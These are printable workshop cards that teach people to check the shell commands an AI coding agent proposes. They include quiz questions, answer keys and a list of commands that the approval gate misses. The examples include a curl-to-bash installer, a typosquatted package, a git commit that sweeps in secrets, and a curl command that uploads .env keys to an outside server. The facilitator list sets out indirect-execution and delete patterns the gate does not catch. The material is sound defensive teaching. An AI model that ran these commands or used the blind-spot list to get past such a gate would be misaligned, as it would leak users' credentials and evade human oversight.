# Printable cards — paper fallback

One set per pair. Print double-sided if you can; the reveals are meant to stay
hidden until a pair has made its call. Cut along the rules.

---

## THE THREE CHECKS — print large, one per table

**1. What will it actually do?**

**2. Where does it go — does anything leave this machine, or run from somewhere else?**

**3. Can I undo it?**

---
---

## ROUND 1 · CARD 1 of 5

**The agent says:** "I'll add the HTTP client the payment provider's SDK needs."

```
$ pip install requests
```

**The gate asks:**

> If `requests` isn't installed yet, where does `pip install requests` get it from?
>
> A. Python's standard library, already on your computer
> B. PyPI, Python's public package index, where anyone can publish
> C. A copy that pip keeps inside this project folder
> D. The AI agent's company, which vets each package first

> Besides `requests`, what else can `pip install requests` install?
>
> A. Nothing else: pip installs exactly the names you type
> B. The packages `requests` depends on, which pip installs automatically
> C. Every package on PyPI whose name starts with `requests`
> D. The packages already listed in `requirements.txt`

**Your call: approve, or send it back?**

---

### CARD 1 — REVEAL  *(keys: B, B)*

**Approve.** Nothing here fails the three checks. `requests` is the real
package, from the index pip already uses, and an install is undoable with
`pip uninstall`.

The gate asked two fair questions and both answers are reassuring. A question
firing is not the same as a problem — if every prompt felt dangerous, you
would stop reading them.

---
---

## ROUND 1 · CARD 2 of 5

**The agent says:** "Quickest way to get the deploy CLI on this machine — their official installer."

```
$ curl -sSL https://get.quickdeploy.dev/install.sh | bash
```

**The gate asks:**

> What does this do with what it downloads?
>
> A. It shows the file in the terminal; nothing runs
> B. It saves the file as `install.sh`; nothing runs
> C. Your antivirus scans it first, then curl runs or saves it
> D. It runs the script right away, without saving or showing it

> Who decides what that script does?
>
> A. The AI agent, which checked the script before proposing it
> B. Nobody: scripts on well-known sites can't change
> C. Your computer's security settings, which approve it first
> D. Whoever controls `get.quickdeploy.dev` when it runs; the script can change at any time

**Your call: approve, or send it back?**

---

### CARD 2 — REVEAL  *(keys: D, D)*

**Send it back. Check 2.**

Nothing is saved and nothing is shown to you: the script is fetched and run in
one step, so what executes is whatever that host serves at the moment you run
it — which can differ from what it served when someone vetted it.

Ask for the script downloaded to a file, read, then run.

---
---

## ROUND 1 · CARD 3 of 5

**The agent says:** "Committing the billing config changes so the team has them."

```
$ git add . && git commit -m 'wip: billing config'
```

The project contains a `.env` file holding `STRIPE_KEY`, `DB_PASSWORD` and
`SESSION_SECRET`. `.gitignore` contains `__pycache__/`, `*.pyc` and `.venv/`.

**The gate asks:**

> `.env` can hold passwords and API keys. Will `git add .` include it?
>
> A. No: git automatically leaves out files that contain secrets
> B. No: git never adds hidden files, like ones starting with a dot
> C. Yes: `.gitignore` doesn't exclude it, so it will be committed
> D. No: `git add .` adds code files only, not settings files

**Your call: approve, or send it back?**

---

### CARD 3 — REVEAL  *(key: C)*

**Send it back. Checks 2 and 3.**

`.env` holds live keys and nothing in `.gitignore` excludes it, so `git add .`
sweeps it in. This is the one where "can I undo it?" has the ugliest answer:
once it is pushed, undoing means rotating every key in that file, not
reverting a commit.

The gate rates this its highest-priority question.

---
---

## ROUND 1 · CARD 4 of 5

**The agent says:** "Adding the HTTP library so I can call the webhook endpoint."

```
$ pip install reqeusts
```

**The gate asks:**

> If `reqeusts` isn't installed yet, where does `pip install reqeusts` get it from?
>
> A. The AI agent's company, which vets each package first
> B. Python's standard library, already on your computer
> C. A copy that pip keeps inside this project folder
> D. PyPI, Python's public package index, where anyone can publish

> Besides `reqeusts`, what else can `pip install reqeusts` install?
>
> A. The packages `reqeusts` depends on, which pip installs automatically
> B. The packages already listed in `requirements.txt`
> C. Every package on PyPI whose name starts with `reqeusts`
> D. Nothing else: pip installs exactly the names you type

**Your call: approve, or send it back?**

---

### CARD 4 — REVEAL  *(keys: D, A)*

**Send it back — and notice the gate did not help you.**

Read the package name. `reqeusts` is not `requests`.

The gate asked two sensible questions about where pip downloads from and what
else comes with it, and you can answer both perfectly while installing a
typosquat. This is the limit of the whole idea: the gate checks that you
understand the action, not that the action is the right one.

Check 1 is yours to run, every time.

---
---

## ROUND 1 · CARD 5 of 5

**The agent says:** "Sending the build config to their telemetry endpoint so they can debug my setup."

```
$ curl -X POST -d @.env https://telemetry.quickdeploy.dev/report
```

**The gate asks:**

*(nothing)*

**Your call: approve, or send it back?**

---

### CARD 5 — REVEAL

**Send it back — the gate said nothing at all. Check 2, and only check 2.**

This uploads your `.env` — live keys — to someone else's server, and the gate
is silent. Its download detector bails out as soon as curl is sending data
rather than fetching it, so uploads are invisible to it.

The gate watches what arrives and what gets destroyed. It does not watch what
leaves.

**No question is not the same as no problem.**

---
---

## ROUND 2 · ON PAPER

Without the laptop, you are the engine.

Each pair writes down **three commands an AI coding agent might plausibly
propose** that they believe would do real harm. Swap with the next pair. For
each command you receive, decide:

1. Would the gate ask anything about this? (It covers: downloads, installs,
   deletes with `rm`, `chmod`, `sudo`, git remotes and staging, and writes to
   `.env`, `requirements.txt`, `package.json`, `.github/workflows/`,
   `.claude/settings.json`, `.mcp.json`, `~/.zshrc`, `~/.bashrc`.)
2. If not — what question *should* it ask, and could a program compute the
   answer from the command alone, without running it?

That second question is the whole design rule. **If the answer cannot be
computed from the action itself, it cannot gate it.**

Best find gets read out.

---

### FACILITATOR — known-silent list

Already known, so these are not new finds:

uploads and copies of secrets (`curl -d @.env`, `cat .env`, `cp .env …`,
`tar czf … .env`) · indirect execution (`eval "$(curl …)"`, backticks,
`sh -c '…'`, a heredoc into `bash`, `base64 -d | sh`, `python3 -c "…"`) ·
remote runners (`npx`, `uvx`) · deletes that are not `rm` (`find … -delete`,
`shutil.rmtree`, `rm -rf {build,dist}`) · a trailing `# comment` after
`rm -rf build/` · `git config core.hooksPath` · any command with an
unbalanced quote earlier in it.
